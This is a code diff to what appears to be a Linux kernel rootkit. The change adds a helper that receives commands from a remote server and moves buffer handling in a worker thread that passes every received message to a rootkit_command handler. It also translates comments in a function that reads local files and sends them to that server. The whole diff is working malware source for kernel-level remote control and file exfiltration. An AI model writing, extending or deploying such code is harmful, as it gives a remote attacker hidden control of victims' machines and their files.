@@ -99,6 +99,29 @@ int send_to_server(char *message, ...) {
     return SUCCESS;
 }
 
+int receive_from_server(char *recv_buffer, int buffer_size) {
+    struct kvec vec;
+    struct msghdr msg = { 0 };
+    int ret;
+
+    if (!recv_buffer) {
+        ERR_MSG("receive_from_server: recv_buffer is NULL\n");
+        return -EINVAL;
+    }
+
+    vec.iov_base = recv_buffer;
+    vec.iov_len = buffer_size;
+
+    ret = kernel_recvmsg(sock, &msg, &vec, 1, vec.iov_len, 0);
+    if (ret < 0) {
+        ERR_MSG("receive_from_server: kernel_recvmsg failed: %d\n", ret);
+        return FAILURE;
+    }
+
+    recv_buffer[ret] = '\0';
+    return SUCCESS;
+}
+
 int send_file_to_server(char *filename) {
     struct file *file = NULL;
     char *buffer = NULL;
@@ -106,7 +129,7 @@ int send_file_to_server(char *filename) {
     ssize_t read_size;
     int ret_code = 0;
 
-    // Allocation du buffer pour les chunks
+    // Allocate buffer for chunks
     buffer = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
     if (!buffer) {
         ERR_MSG("send_file_to_server: failed to allocate buffer\n");
@@ -114,7 +137,7 @@ int send_file_to_server(char *filename) {
     }
     memset(buffer, 0, STD_BUFFER_SIZE);
 
-    // Ouverture du fichier
+    // Open the file
     file = filp_open(filename, O_RDONLY, 0);
     if (IS_ERR(file)) {
         ERR_MSG("send_file_to_server: failed to open file %s\n", filename);
@@ -122,7 +145,7 @@ int send_file_to_server(char *filename) {
         return -ENOENT;
     }
 
-    // Lecture et envoi du fichier chunk par chunk
+    // Read and send the file chunk by chunk
     while ((read_size = kernel_read(file, buffer, STD_BUFFER_SIZE, &pos)) > 0) {
         struct kvec vec = {
             .iov_base = buffer,
@@ -149,7 +172,7 @@ int send_file_to_server(char *filename) {
         ret_code = SUCCESS;
     }
 
-    // Nettoyage
+    // Cleanup
     filp_close(file, NULL);
     kfree(buffer);
 
@@ -227,29 +250,13 @@ int network_worker(void *data) {
     unsigned empty_count = 0;
     // Listen for commands
     // Retry until 'killcom' is received or thread is stopped by unmonting the module
+    char *recv_buffer = kmalloc(RCV_CMD_BUFFER_SIZE, GFP_KERNEL);
     while (!kthread_should_stop() && !thread_exited) {
-        struct kvec recv_vec;
-        struct msghdr recv_msg = { 0 };
-
-        char *recv_buffer = kmalloc(RCV_CMD_BUFFER_SIZE, GFP_KERNEL);
-        if (!recv_buffer) {
-            ERR_MSG("network_worker: failed to allocate recv_buffer\n");
-            break;
-        }
-
-        recv_vec.iov_base = recv_buffer;
-        recv_vec.iov_len = RCV_CMD_BUFFER_SIZE;
-
-        // Wait to receive a message from the server
-        ret_code = kernel_recvmsg(sock, &recv_msg, &recv_vec, 1, recv_vec.iov_len, 0);
-        if (ret_code < 0) {
-            ERR_MSG("network_worker: error receiving message: %d\n", ret_code);
+        if (receive_from_server(recv_buffer, RCV_CMD_BUFFER_SIZE) == FAILURE) {
             msleep(TIMEOUT_BEFORE_RETRY);
             continue;
         }
 
-        // Null-terminate the received message
-        recv_buffer[ret_code] = '\0';
         DBG_MSG("network_worker: received: %s", recv_buffer);
 
         // Check if the received message is empty
@@ -267,10 +274,10 @@ int network_worker(void *data) {
 
         if (strcmp(recv_buffer, "\n") != 0)
             rootkit_command(recv_buffer, RCV_CMD_BUFFER_SIZE);
-
-        kfree(recv_buffer);
-        recv_buffer = NULL;
     }
+
+    kfree(recv_buffer);
+    recv_buffer = NULL;
 
     if (restart_on_error)
         network_worker(data);
